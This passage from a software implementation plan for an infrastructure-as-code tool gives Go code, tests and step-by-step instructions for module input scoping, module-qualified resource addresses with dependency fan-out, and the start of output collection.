				WithScope(value.ScopeModuleDefault))
			continue
		}

		// Coerce, then judge, then store — the same order and for the same
		// reason as variables.Resolve: compareBounds reads both sides in the
		// declared kind, so an uncoerced value is not merely mistyped, it is
		// silently unbounded.
		coerced, coerceDiags := s.Coerce(v)
		if coerceDiags.HasErrors() {
			w.ds.Extend(coerceDiags)
			continue
		}
		w.ds.Extend(s.Validate(coerced))
		// Stored exactly as evaluation produced it. Amendment 8b: stage 5 does
		// not re-stamp Scope. A literal arrives as stage 2 left it and a
		// ${count} from --var keeps ScopeCLIOverride, because Evaluate returns
		// the variable's own Value — a module boundary is a point where it is
		// tempting to re-derive provenance, and the rule is that provenance is
		// recorded where a value ENTERS, not where it is passed along.
		inner.Vars.Override(d.Name, coerced)
	}

	return inner
}

// evaluateCall resolves a module call's attributes IN THE CALLER'S SCOPE.
//
// Stage 5 does this rather than leaving it to stage 6's bindAttribute, because
// stage 5 runs first and cannot build the module's scope without these values;
// after expansion the call resource is gone, so stage 6 never sees it. The
// three calls below are the three bindAttribute makes, in the same order, so
// the two stages cannot disagree about what an attribute means.
func (w *walker) evaluateCall(
	r *config.ResourceDecl, caller *Scope, exprs map[string]*value.Expr,
) map[string]value.Value {
	out := make(map[string]value.Value, len(r.Attributes))
	for _, name := range sortedAttributeNames(r.Attributes) {
		attr := r.Attributes[name]
		if e, parsed := exprs[name]; parsed {
			// Qualify BEFORE evaluating: a ${name.attr} must be resolved
			// against the caller's names, and a module output folded in, while
			// the tree is still a tree (Amendment 7).
			evaluated, evalDiags := expressions.Evaluate(caller.Qualify(e), caller)
			w.ds.Extend(evalDiags)
			out[name] = evaluated
			continue
		}
		if attr.HasExpressions {
			continue // parseCall already reported why
		}
		out[name] = attr.Value
	}
	return out
}

// sortedAttributeNames visits attributes in a stable order. Go's map iteration
// is randomised, and diagnostic order within one resource must not change
// between runs of the same configuration (invariant 6).
func sortedAttributeNames(attrs map[string]config.AttributeDecl) []string {
	out := make([]string, 0, len(attrs))
	for name := range attrs {
		out = append(out, name)
	}
	sort.Strings(out)
	return out
}

// inputNames lists a module's declared inputs for a diagnostic. lv.Inputs is
// already sorted by name (stage 2), so there is nothing to sort — reading the
// slice rather than a map is what keeps the message identical between runs.
func inputNames(decls []config.VariableDecl) []string {
	out := make([]string, 0, len(decls))
	for _, d := range decls {
		out = append(out, d.Name)
	}
	if len(out) == 0 {
		return []string{"(none)"}
	}
	return out
}
```

#### 5.6 Thread the scope through the walk

In `internal/modules/expand.go`:

```go
type Instance struct {
	Decl *config.ResourceDecl
	// Scope is the level this resource was instantiated at, shared by every
	// resource at that level. Compiler stage 6 evaluates the resource's
	// attributes against it.
	Scope *Scope
}
```

`Expand` builds the root scope:

```go
	w := &walker{root: abs, resolve: resolve, ds: &ds}
	w.expand(rootLevel(project), &Scope{Vars: scope}, abs, nil)
```

`expand` and `instantiate` take `*Scope` instead of `variables.Scope`, record it on each
instance, and `instantiate` ends:

```go
	childLevel := moduleLevel(child)
	supplied := w.evaluateCall(r, caller, w.parseCall(r))
	innerScope := w.moduleScope(r, childLevel, caller, supplied, inner)
	w.expand(childLevel, innerScope, lm.Dir, inner)
```

`parseCall` is added in Task 7, which needs the parsed trees for ordering; until then
inline `expressions.Parse` per attribute with `HasExpressions` set. **`Scope.Module` is
built by copying, never by `append(module, r.Name)`** — an `append` on a slice with spare
capacity writes into the parent's backing array, so two sibling instantiations would
silently share and overwrite one path.

#### 5.7 Run them, see them pass

```bash
go test -count=1 ./internal/modules/ ./internal/variables/
```

#### 5.8 Verify each rung is actually pinned

```bash
# 1. In moduleScope, stamp the default value.ScopeBaseConfig.
#    TestUnsuppliedInputTakesTheDeclaredDefaultAtScopeModuleDefault fails.
# 2. Re-add 5b's fill — WithScope(value.ScopeBaseConfig) on every supplied value.
#    TestCallerSuppliedInputKeepsTheProvenanceOfWhatSuppliedIt fails.
# 3. In evaluateCall, pass `inner` instead of `caller` (build it before the loop
#    so it compiles). TestInputIsEvaluatedInTheCallersScopeNotTheModules fails.
# 4. In moduleScope, copy the WHOLE caller scope instead of ProcessVariables.
#    TestModuleDoesNotSeeTheCallersVariables fails.
# 5. Change the unset-input poison to value.Unknown(value.KindString, ...).
#    TestUnsetInputCarriesItsDeclaredKindNotKindString fails.
# Restore each.
```

#### 5.9 Commit

```bash
go test -count=1 ./... && go vet ./... && gofmt -l .
git add internal/modules/inputs.go internal/modules/inputs_test.go internal/modules/expand.go \
  internal/variables/schema.go internal/variables/schema_test.go \
  internal/variables/resolve.go internal/variables/resolve_test.go
git commit -m "M5 task 5: module inputs evaluated in the caller's scope; ScopeModuleDefault populated" -- \
  internal/modules/inputs.go internal/modules/inputs_test.go internal/modules/expand.go \
  internal/variables/schema.go internal/variables/schema_test.go \
  internal/variables/resolve.go internal/variables/resolve_test.go
```

---

---

## Task 6 — instantiate resources under module-qualified addresses

### Why this task exists

The failure it prevents is two resources with one address. Two modules that each declare
a `db` produce two resources both addressed `db`; the expansion's map — and the state file
keyed by the same string — keeps one. The plan is not wrong-looking: it shows one `db`
instead of two, and the second module's database is never created, or the first's is
destroyed and replaced by the second's on the next apply. This is Ruling 1's silently
wrong plan, one layer down from the reference.

There is a second failure that Amendment 8 created and that nothing else catches. A module
call is a resource with a name, so `depends_on: [prod]` and `${prod.endpoint}` are
ordinary things to write — but after expansion **no resource is addressed `prod`**. Every
such edge has to fan out to what `prod` expanded into, or it silently names nothing.

It is also the task that pays Ruling 7's bill: a resource's address embeds its module path
permanently, so moving a resource between modules renames it, and a rename is a destroy
plus a create. Spec §5.2 defers `state mv`, which makes this a real way to lose a
database in Phase 1. `CLAUDE.md` says it must be documented where a user meets it.

### Files

- modify `internal/modules/expand.go`
- create `internal/modules/address.go`
- create `internal/modules/address_test.go`
- modify `PLAN.md`, `CLAUDE.md`

### Interfaces

**Consumes:** `address.Address.InModule`, `address.Address.String`, `address.Sort`,
`value.Origin.InModule` (Task 9), `config.ResourceDecl`, `config.AttributeDecl`.

**Produces:**

```go
type Instance struct {
	// Address is module-qualified: a resource `db` inside an instantiation
	// `net` is `module.net.db`. Root resources keep an empty Module.
	Address address.Address
	// Decl is a COPY owned by this instance. Its Origin, and every
	// AttributeDecl's Origin, carry Module.
	Decl  *config.ResourceDecl
	Scope *Scope
	// ExtraDeps are edges that could not be expressed as a bare name, because
	// the name they came from expanded away.
	ExtraDeps []address.Address
}

type Expansion struct {
	Project     string     // the ROOT project name, carried once per compilation
	Resolutions []Resolved // every remote source resolved, deduped and sorted
	Instances   []Instance // sorted by Address, once, at the end
}
```

### The rulings this task fixes, and why

1. **Addresses are built top-down, folding `InModule` over the path** — not bottom-up by
   re-rooting a child's results on the way out. Re-rooting looks cheaper and is a trap:
   Task 7 collects module outputs as `value.Value`s carrying expression trees whose
   references name qualified addresses, so re-rooting a level would have to rewrite every
   address inside every output's tree at every level it unwinds through. Top-down means no
   address in this package is ever rewritten.

2. **`InModule` rather than assembling `Address{Module: path}` directly.** It copies the
   slice on every call, so no `Address` can alias the walker's path — which the walker
   mutates as it pops.

   The form is `module.prod.database`, with a `module` segment per level (Amendment 12a,
   and `PLAN.md` §11.2 is corrected to match). **`pkg/address` does not change**:
   `Address.String()` and `InModule` are both already correct. The redundant marker is
   kept because an instance both CONTAINS resources and EXPOSES outputs, so without it
   `prod.endpoint` (an output reference) and `prod.database` (a contained resource's
   address) are the same shape under two different grammars.

3. **Each instance gets its own `*config.ResourceDecl`.** Stage 2 produces one declaration
   per resource per FILE, and one file may be instantiated many times; the two need
   different `Origin.Module`s. Stamping stage 2's shared struct would give every
   instantiation the path of whichever was expanded last.

4. **A module call's own name is never an address.** `prod: {type: module.app_stack}`
   produces `module.prod.*` and nothing called `prod`. So a `depends_on: [prod]` on a
   sibling, and a module call's own `depends_on:`, both fan out — in opposite directions —
   and both land in `ExtraDeps` rather than in `Decl.DependsOn`, which holds bare names
   stage 6 resolves. One slice holding both kinds of entry would make every consumer ask
   which kind it had.

5. **`Instances` is sorted exactly once, at the end of `Expand`.** The walk is already
   deterministic — stage 2 sorts resources by name — but determinism of the WALK is not
   determinism of the OUTPUT: a level's own resources interleave with its modules'. M3
   measured eleven redundant sorts whose only job was undoing map iteration; this is the
   one that is not redundant.

### Steps

#### 6.1 Failing tests

Create `internal/modules/address_test.go`:

```go
package modules

import (
	"strings"
	"testing"

	"github.com/infrata/infrata/internal/variables"
)

func addresses(exp *Expansion) []string {
	out := make([]string, 0, len(exp.Instances))
	for _, inst := range exp.Instances {
		out = append(out, inst.Address.String())
	}
	return out
}

func TestResourcesInAModuleCarryTheModuleQualifiedAddress(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./net
resources:
  gateway:
    type: test.thing
  net:
    type: module.net
`,
		"net/module.yml": `
modules:
  - ../deep
resources:
  subnet:
    type: test.thing
  inner:
    type: module.deep
`,
		"deep/module.yml": "resources:\n  route:\n    type: test.thing\n",
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	want := []string{"gateway", "module.net.module.inner.route", "module.net.subnet"}
	got := addresses(exp)
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("addresses = %v, want %v", got, want)
	}
}

// The ordering fixture. The expected output CONTRADICTS every walk order:
// `module.mid.x` sorts BETWEEN the two root resources, so no traversal — plain
// resources then calls, or calls then plain resources — produces it. A fixture
// already in address order would pass against an implementation that never
// sorted, and would look tidier.
func TestExpansionIsSortedByAddress(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./mid
resources:
  alpha:
    type: test.thing
  zeta:
    type: test.thing
  mid:
    type: module.mid
`,
		"mid/module.yml": "resources:\n  x:\n    type: test.thing\n",
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	want := []string{"alpha", "module.mid.x", "zeta"}
	got := addresses(exp)
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("addresses = %v, want %v — invariant 6 requires one deterministic order, and "+
			"the module's resource sorts BETWEEN the two root ones, which no walk order "+
			"produces", got, want)
	}
}

func TestOriginNamesTheInstantiationAResourceCameFrom(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml":      "project: demo\nmodules:\n  - ./net\nresources:\n  net1:\n    type: module.net\n",
		"net/module.yml": "resources:\n  subnet:\n    type: test.thing\n    tag: production\n",
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}
	inst := exp.Instances[0]

	if strings.Join(inst.Decl.Origin.Module, ".") != "net1" {
		t.Errorf("Origin.Module = %v, want [net1] — Ruling 7 makes this the ONLY way an error "+
			"message can say which instantiation a problem came from", inst.Decl.Origin.Module)
	}
	attr, ok := inst.Decl.Attributes["tag"]
	if !ok {
		t.Fatal("attribute `tag` missing from the copied declaration")
	}
	if strings.Join(attr.Origin.Module, ".") != "net1" {
		t.Errorf("attribute Origin.Module = %v, want [net1] — a diagnostic about one ATTRIBUTE "+
			"points at the attribute's origin, not the resource's", attr.Origin.Module)
	}
}

func TestTwoInstantiationsOfOneSourceDoNotShareADeclaration(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./m
resources:
  left:
    type: module.m
  right:
    type: module.m
`,
		"m/module.yml": "resources:\n  thing:\n    type: test.thing\n",
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}
	if len(exp.Instances) != 2 {
		t.Fatalf("got %d instances, want 2", len(exp.Instances))
	}

	a, b := exp.Instances[0], exp.Instances[1]
	if a.Decl == b.Decl {
		t.Fatal("two instantiations share one *config.ResourceDecl; stamping Origin.Module on " +
			"it gives BOTH the path of whichever was expanded last")
	}
	if strings.Join(a.Decl.Origin.Module, ".") == strings.Join(b.Decl.Origin.Module, ".") {
		t.Errorf("both instantiations report Origin.Module %v", a.Decl.Origin.Module)
	}
	if a.Address.String() != "module.left.thing" || b.Address.String() != "module.right.thing" {
		t.Errorf("addresses = %v, want [module.left.thing module.right.thing]", addresses(exp))
	}
}

// Amendment 8's new hazard. `prod` is a resource NAME the user wrote, and after
// expansion nothing is addressed `prod`.
func TestDependsOnAModuleCallFansOutToEveryResourceItProduced(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./net
resources:
  netA:
    type: module.net
  web:
    type: test.thing
    depends_on: [netA]
`,
		"net/module.yml": "resources:\n  subnet:\n    type: test.thing\n  gateway:\n    type: test.thing\n",
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	var web Instance
	for _, inst := range exp.Instances {
		if inst.Address.String() == "web" {
			web = inst
		}
	}
	var got []string
	for _, a := range web.ExtraDeps {
		got = append(got, a.String())
	}
	want := []string{"module.netA.gateway", "module.netA.subnet"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("web ExtraDeps = %v, want %v — nothing is addressed `netA` after expansion, "+
			"so an edge naming it must fan out or it names nothing at all", got, want)
	}
}

func TestAModuleCallsOwnDependsOnReachesEveryResourceItProduced(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./app
resources:
  base:
    type: test.thing
  appA:
    type: module.app
    depends_on: [base]
`,
		"app/module.yml": "resources:\n  server:\n    type: test.thing\n",
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	var server Instance
	for _, inst := range exp.Instances {
		if inst.Address.String() == "module.appA.server" {
			server = inst
		}
	}
	if len(server.ExtraDeps) != 1 || server.ExtraDeps[0].String() != "base" {
		t.Fatalf("module.appA.server ExtraDeps = %v, want [base] — a depends_on written on the "+
			"CALL belongs to everything the call expands into", server.ExtraDeps)
	}
}
```

#### 6.2 Run them, see them fail

```bash
go test -count=1 ./internal/modules/
```

Expect `inst.Address undefined`, `inst.ExtraDeps undefined`.

#### 6.3 Addressing and declaration copying

Create `internal/modules/address.go`:

```go
package modules

import (
	"sort"

	"github.com/infrata/infrata/internal/config"
	"github.com/infrata/infrata/pkg/address"
	"github.com/infrata/infrata/pkg/value"
)

// addressIn builds a resource's canonical address from the instantiation path.
//
// Top-down, folding InModule from the innermost path element outward, rather
// than re-rooting a child's results on the way out of the recursion. Re-rooting
// is the tempting alternative and it does not survive Task 7: a collected module
// output is a value.Value carrying an expression tree whose references name
// qualified addresses, so re-rooting a level would have to rewrite every
// address inside every output's tree, at every level it unwinds through.
// Building the full address at instantiation means no address here is ever
// rewritten.
//
// InModule copies the module slice on each call, so the result cannot alias the
// walker's path — which the walker mutates as it pops.
//
// DEPENDS ON a guard stage 5 does not own: Address.String() is only unambiguous
// because a resource's logical name is an identifier. Without that,
// `resources: { module.prod.database: … }` produces a state key identical to
// the canonical address of `database` inside instance `prod` (contract
// Amendment 16a, verified through the binary; Author A owns the check in
// Task 2). Do NOT add a second check here — stage 2 holds the line number, and
// Amendment 13b already ruled on exactly this shape. Recorded so that the
// dependency is visible from both ends: if that guard is ever removed, this is
// what breaks.
func addressIn(module []string, name string) address.Address {
	a := address.Address{Name: name}
	for i := len(module) - 1; i >= 0; i-- {
		a = a.InModule(module[i])
	}
	return a
}

// instantiateDecl copies one resource declaration for one instantiation and
// stamps the module path into every Origin it carries.
//
// A copy, not stage 2's struct: one module file instantiated twice needs two
// declarations with two different Origin.Modules, and stamping the shared struct
// would give both the path of whichever was expanded last. The maps are rebuilt
// because stage 2's are shared for the same reason.
//
// Every AttributeDecl's Origin is stamped too, not just the resource's. A
// diagnostic about one attribute points at that attribute's line, so an
// unstamped attribute Origin names a file and a line inside a module without
// saying which instantiation of it — exactly what Ruling 7 says the module path
// is for.
func instantiateDecl(decl *config.ResourceDecl, module []string) *config.ResourceDecl {
	out := *decl
	out.Origin = originInPath(decl.Origin, module)
	out.DependsOn = append([]string(nil), decl.DependsOn...)

	out.Attributes = make(map[string]config.AttributeDecl, len(decl.Attributes))
	for name, attr := range decl.Attributes {
		attr.Origin = originInPath(attr.Origin, module)
		attr.Value = attr.Value.WithOrigin(originInPath(attr.Value.Origin, module))
		out.Attributes[name] = attr
	}
	return &out
}

// originInPath stamps an origin with the whole instantiation path, folding
// Task 9's single-level value.Origin.InModule from the innermost element
// outward — the same shape as addressIn and inModulePath, and for the same
// reason: InModule prepends and copies, so folding it builds the full path with
// no slice shared between two origins. Task 9 owns the single-level primitive;
// this is not a second implementation of it.
func originInPath(o value.Origin, module []string) value.Origin {
	for i := len(module) - 1; i >= 0; i-- {
		o = o.InModule(module[i])
	}
	return o
}

// attachEdges gives every address in `to` the edges in `edges`.
//
// Both directions of Amendment 8's fan-out land here: a module call's own
// depends_on becomes edges FROM everything it produced, and a sibling's
// depends_on naming the call becomes edges TO everything it produced. Neither
// can be expressed as a bare name, because after expansion nothing is addressed
// with the call's name.
func (w *walker) attachEdges(to []address.Address, edges []address.Address) {
	if len(to) == 0 || len(edges) == 0 {
		return
	}
	in := make(map[string]bool, len(to))
	for _, a := range to {
		in[a.String()] = true
	}
	for i := range w.instances {
		if in[w.instances[i].Address.String()] {
			w.instances[i].ExtraDeps = append(w.instances[i].ExtraDeps, edges...)
		}
	}
}

// sortAddresses orders edges so the dependency graph is identical on every run.
// Fan-out reads from a map, and invariant 6 requires the same configuration to
// produce the same edges in the same order.
func sortAddresses(a []address.Address) []address.Address {
	address.Sort(a)
	return a
}

var _ = sort.Strings // retained if the file otherwise drops the import
```

Delete the `sort` import and the trailing `var _` if nothing else in the file uses it.

#### 6.4 Wire it into the walk

Add to `Instance`:

```go
	// Address is module-qualified: a resource `db` inside an instantiation
	// `net` is `module.net.db`. A root resource keeps an empty Module.
	//
	// THE ADDRESS EMBEDS THE MODULE PATH PERMANENTLY (spec §5.2). Moving a
	// resource from one module to another renames it, and a rename is a destroy
	// plus a create — there is no `state mv` in Phase 1.
	Address address.Address
	// ExtraDeps are edges that could not be written as a bare name, because the
	// name they came from expanded away. Separate from Decl.DependsOn, which
	// holds bare names stage 6 resolves against the level's own scope: one
	// slice holding both kinds would make every consumer ask which it had.
	ExtraDeps []address.Address
```

`expand` records addresses and returns what it produced, so a caller can fan out:

```go
func (w *walker) expand(lv level, scope *Scope, dir string, module []string) []address.Address {
	loaded := w.loadModules(lv, dir, module)

	var produced []address.Address
	// calls maps a module call's resource NAME to the addresses it produced.
	// Nothing is addressed with that name after expansion, so this table is the
	// only way an edge naming it can be resolved.
	calls := map[string][]address.Address{}

	for _, r := range lv.Resources {
		if strings.HasPrefix(r.Type, TypePrefix) {
			continue
		}
		addr := addressIn(module, r.Name)
		w.instances = append(w.instances, Instance{
			Address: addr,
			Decl:    instantiateDecl(r, module),
			Scope:   scope,
		})
		produced = append(produced, addr)
	}

	for _, r := range lv.Resources {
		if !strings.HasPrefix(r.Type, TypePrefix) {
			continue
		}
		inner := w.instantiate(r, loaded, scope, dir, module)
		calls[r.Name] = inner
		produced = append(produced, inner...)
	}

	w.fanOut(lv, calls, module)
	return produced
}

// fanOut rewrites every depends_on edge that names, or is written on, a module
// call — the two cases Amendment 8 created by making an instantiation a
// resource with a name that does not survive expansion.
func (w *walker) fanOut(lv level, calls map[string][]address.Address, module []string) {
	for _, r := range lv.Resources {
		isCall := strings.HasPrefix(r.Type, TypePrefix)

		var edges []address.Address
		for _, target := range r.DependsOn {
			produced, ok := calls[target]
			if !ok {
				// A plain resource: stage 6 resolves the bare name against the
				// level's scope, which is where a name that binds to nothing is
				// reported. Nothing to do here.
				continue
			}
			edges = append(edges, produced...)
		}
		edges = sortAddresses(edges)

		if isCall {
			// The call's own depends_on belongs to everything it expanded into.
			// Its non-call targets are bare names that no longer have a
			// resource to sit on, so they are resolved here too.
			w.attachEdges(calls[r.Name], append(edges, w.plainTargets(r, calls, module)...))
			continue
		}
		w.attachEdges([]address.Address{addressIn(module, r.Name)}, edges)
	}
}

// plainTargets resolves a module call's depends_on entries that name ordinary
// resources at the same level. A plain resource keeps its bare names for stage
// 6; a module call cannot, because the resources that inherit the edge are in a
// different scope and stage 6 would resolve the name there.
func (w *walker) plainTargets(
	r *config.ResourceDecl, calls map[string][]address.Address, module []string,
) []address.Address {
	var out []address.Address
	for _, target := range r.DependsOn {
		if _, isCall := calls[target]; isCall {
			continue
		}
		out = append(out, addressIn(module, target))
	}
	return sortAddresses(out)
}
```

`instantiate` returns the addresses its module produced. Change its signature to return
`[]address.Address`, return `nil` from each early-return path, and end with:

```go
	return w.expand(childLevel, innerScope, lm.Dir, inner)
```

`Expand` sorts once:

```go
	w.expand(rootLevel(project), &Scope{Vars: scope}, abs, nil)

	// ONE sort, here, after everything is collected. The walk is already
	// deterministic — stage 2 sorts resources by name — but a deterministic
	// walk is not address order: a level's own resources interleave with its
	// modules'. Invariant 6 wants address order, and sorting anywhere earlier
	// would be undone by the next append.
	sort.Slice(w.instances, func(i, j int) bool {
		return w.instances[i].Address.String() < w.instances[j].Address.String()
	})
	return &Expansion{
		Project:     project.Project,
		Resolutions: w.sortedResolutions(),
		Instances:   w.instances,
	}, ds
```

Add `"sort"` and `"github.com/infrata/infrata/pkg/address"` to `expand.go`'s imports.

#### 6.5 Run them, see them pass

```bash
go test -count=1 ./internal/modules/
```

#### 6.6 Document the destroy-and-recreate consequence

Ruling 7: documented where a user meets it, not discovered by losing a database.

Append to `PLAN.md` §11, after the outputs example:

```markdown
### A resource's address includes its module path

A resource declared inside a module is addressed `module.<instantiation>.<name>`, and
state is keyed by that address. Moving a resource from one module to another — or renaming
the resource that instantiates the module — therefore RENAMES it, and a rename is a
destroy followed by a create, not a move.

There is no `infra state mv` yet. Before restructuring modules that manage a resource
holding data, run `infra plan <env>` and read it: a destroy you did not intend appears
there.
```

Add to `CLAUDE.md` after invariant 4:

```markdown
> **Addresses embed the module path** (spec §5.2, §7.2). Moving a resource between modules
> renames it, which the planner reads as a destroy plus a create. This is the price of
> compile-time flattening and is documented in `PLAN.md` §11; `state mv` is deferred past
> Phase 1.
```

#### 6.7 Verify each rule is actually pinned

```bash
# 1. Delete the sort in Expand. TestExpansionIsSortedByAddress fails.
# 2. Make instantiateDecl return `decl` unchanged. Both the shared-declaration
#    and the Origin test fail.
# 3. Stamp only out.Origin, not the attribute origins. The Origin test fails on
#    its second assertion.
# 4. Delete the fanOut call. Both depends_on tests fail.
# 5. Delete sortAddresses' call in fanOut and run the fan-out test 20 times:
go test -count=20 -run TestDependsOnAModuleCallFansOut ./internal/modules/
#    It must fail at least once — `calls` is a map. If it passes 20/20 the test
#    is not pinning the sort and the fixture needs a second module call whose
#    resources would interleave. Restore either way.
```

#### 6.8 Commit

```bash
go test -count=1 ./... && go vet ./... && gofmt -l .
git add internal/modules/address.go internal/modules/address_test.go internal/modules/expand.go \
  PLAN.md CLAUDE.md
git commit -m "M5 task 6: module-qualified addresses, origins and depends_on fan-out" -- \
  internal/modules/address.go internal/modules/address_test.go internal/modules/expand.go \
  PLAN.md CLAUDE.md
```

---

---

## Task 7 — collect outputs, and resolve scope-relative references

### Why this task exists

**Ruling 1's landmine, one stage later.** `${db.id}` written inside a module parses to a
reference naming `db` with an empty module path — the parser has no scope and must not
guess. If nothing fills that path, two modules each declaring a `db` resolve to the same
resource, and `Reference` carries a module field that nothing ever sets, which makes the
bug look handled. Amendment 7 settled where the relative-to-absolute step happens: stage 6
parses, `Scope.Qualify` makes absolute, stage 6 evaluates.

**An output is an expression over the module's resources, so at plan time it is routinely
UNKNOWN.** If an unknown output rendered as an empty string, a plan would show
`database_url: ""` for a connection string that is merely not known yet — a plan that
lies, which is the failure this engine refuses above all others. `value.Coerce`'s unknown
branch was written in M4 as deliberately dead code with a comment saying it goes live in
M5.

Amendment 8 narrowed Ruling 4's caller-side half: `${prod.endpoint}` where `prod` is a
module call is now syntactically a plain resource reference. It did not remove the work.
`prod` still resolves to an OUTPUT rather than to an attribute, and to a set of addresses
rather than to one, so the caller-side lookup is the same mechanism with one fewer
question to ask.

### Files

- modify `internal/modules/inputs.go`, `internal/modules/expand.go`
- create `internal/modules/outputs.go`
- create `internal/modules/outputs_test.go`

### Interfaces

**Consumes:** `graph.New`, `graph.Graph.Add`, `graph.Graph.Edge` (PANICS on an unknown
endpoint), `graph.Graph.Layers`, `graph.Graph.Cycle`, `value.Expr.References`,
`value.Coerce`, `expressions.Parse`, `expressions.Evaluate`.

**Produces** — Tasks 8–10 depend on exactly these:

```go
type BindingKind uint8

const (
	BindsNothing BindingKind = iota
	BindsResource
	BindsModule
)

// Binding is what one bare name refers to at one level.
type Binding struct {
	Kind BindingKind
	// Address is the qualified resource, when Kind is BindsResource.
	Address address.Address
	// Addresses is everything the call produced, when Kind is BindsModule.
	Addresses []address.Address
	// Outputs are the call's collected outputs, when Kind is BindsModule.
	Outputs map[string]value.Value
}

func (s *Scope) Lookup(name string) (Binding, bool)
func (s *Scope) Names() []string // sorted, for diagnostics

// Qualify rewrites a parsed expression against this level's names. Compiler
// stage 6 MUST call it between expressions.Parse and expressions.Evaluate.
// It emits no diagnostics — see OutputNames and Amendment 11.
func (s *Scope) Qualify(e *value.Expr) *value.Expr

// OutputNames reports the outputs a module instance exposes, SORTED, and false
// when name is not a module instance here. Task 8 reaches it as
// `inst.Scope.OutputNames(name)`.
//
// On Scope rather than on Instance, and Amendment 14c confirms this is the
// shape: after expansion NO Instance represents a module instance — an
// instance's resources are flattened out and the call itself exists only as a
// Binding in the enclosing Scope, so a method on Instance would have nothing to
// answer from, and a FIELD on it would put an instance's outputs in two places
// that can disagree. Amendment 13c's instruction to add one is withdrawn.
func (s *Scope) OutputNames(name string) ([]string, bool)
```

**The seam Tasks 8–10 wire.** `internal/compiler/bind.go:140`'s `bindAttribute` becomes
parse → `inst.Scope.Qualify(e)` → evaluate against `inst.Scope`. Without `Qualify` the
landmine returns; `compileScope` is then redundant, because `*modules.Scope` satisfies
`expressions.Scope` with the same two answers.

### The rulings this task fixes, and why

1. **`Qualify` FOLDS a module output into an `OpLiteral` carrying the output VALUE, known
   or unknown alike.** One branch, not two, and the uniformity is load-bearing. Splicing
   the output's `*value.Expr` for the unknown case loses the Kind:
   `internal/expressions/eval.go` re-derives an unresolved reference as `KindString`, so
   an output resolved as an unknown INTEGER would arrive at the caller as an unknown
   string and Amendment 2's chain would report a type mismatch instead of reaching
   `Coerce`. An `OpLiteral` loses nothing — `evaluate`'s `OpLiteral` case returns
   `e.Literal.WithOrigin(…)` verbatim, so `Known`, `Kind`, `Sensitive` and the value's own
   `Expr` all survive, and the dependency edge survives with them because the unknown's
   `Expr` still points at the qualified resource inside the module.

2. **Sensitivity rides along.** Dropping it when folding would launder a secret into a
   plan artifact — `value.Expr.String` redacts a sensitive literal for exactly this
   reason, so that folding never becomes a second redaction path.

3. **`Qualify` reports nothing, and supplies candidates instead** (Amendment 11). Ruling
   4's "a name that binds to neither is a diagnostic naming both possibilities" still
   holds, and so does the module-output-does-not-exist case — but both are
   attribute-existence at a boundary, and nothing validates attribute existence today:
   `bind.go:148` checks only that the RESOURCE is declared, so `${store.endpoint}` on a
   `test.network` with no `endpoint` passes `validate`, plans clean, and fails halfway
   through `apply` after creating real infrastructure. Task 8 closes that generally.
   Stage 5 is the MODULE ARM of that one check: it leaves an unresolvable reference
   exactly as it stands and exposes `Names()` and `OutputNames()` for the check to build
   its message from. A module-only diagnostic here would be a module-only implementation
   of something the compiler does generally — the shape Amendment 8 just removed from the
   input-provenance code.

   **The cost, stated because it is a seam:** the MESSAGE is then tested only on Task 8's
   side. These tests pin the DATA — that the candidate lists are right, sorted, and
   present — and Task 8 must assert that a mistyped module-call name produces "no resource
   or module named X" rather than "no resource named X", or Ruling 4's wording is
   implemented by nobody.

4. **Module calls are expanded in topological order over their attribute references, not
   name order.** `PLAN.md` §11's own example has an `application` call taking
   `${database.connection_string}`, and `application` sorts before `database`. The order
   comes from `graph.Layers()`, whose layers are sorted by ID, so it is deterministic and
   degenerates to name order when nothing references anything (invariant 6). Every node is
   added before any edge, because `graph.Edge` panics on an endpoint it has not seen and
   says so in its doc comment.

5. **This cycle is a different failure from Task 4's** and says so in different words. Two
   module SOURCES that instantiate each other never terminate; two sibling calls whose
   attributes read each other's outputs terminate fine and simply have no valid order.

6. **Attributes are parsed ONCE.** The ordering pass needs the references and the
   evaluation needs the trees; parsing twice would report every syntax error twice.

7. **An output's `value:` is an expression written `${...}`** (Amendment 4). A bare scalar
   is a literal, because that is what it is everywhere else in this language, and making
   outputs the exception would give the language a second reference syntax. `PLAN.md`
   §11's `value: service.endpoint` is the document being wrong — and because it is the
   spelling users will copy, a bare scalar gets a WARNING when ALL THREE of: exactly one
   dot, the part before it names something in scope, and no character that says "this is
   data" (space, `/`, `:`, `$`). `db.example.com` has two dots and never warns even where
   a resource `db` exists; `1.2.3` has two; `production` has none.

### Steps

#### 7.1 Failing tests

Create `internal/modules/outputs_test.go`:

```go
package modules

import (
	"strings"
	"testing"

	"github.com/infrata/infrata/internal/diag"
	"github.com/infrata/infrata/internal/expressions"
	"github.com/infrata/infrata/internal/variables"
	"github.com/infrata/infrata/pkg/value"
)

// evalAt parses, qualifies and evaluates src in the named resource's scope —
// the exact sequence compiler stage 6 performs.
func evalAt(t *testing.T, exp *Expansion, resource, src string) (value.Value, diag.Diagnostics) {
	t.Helper()
	scope := scopeOf(t, exp, resource)
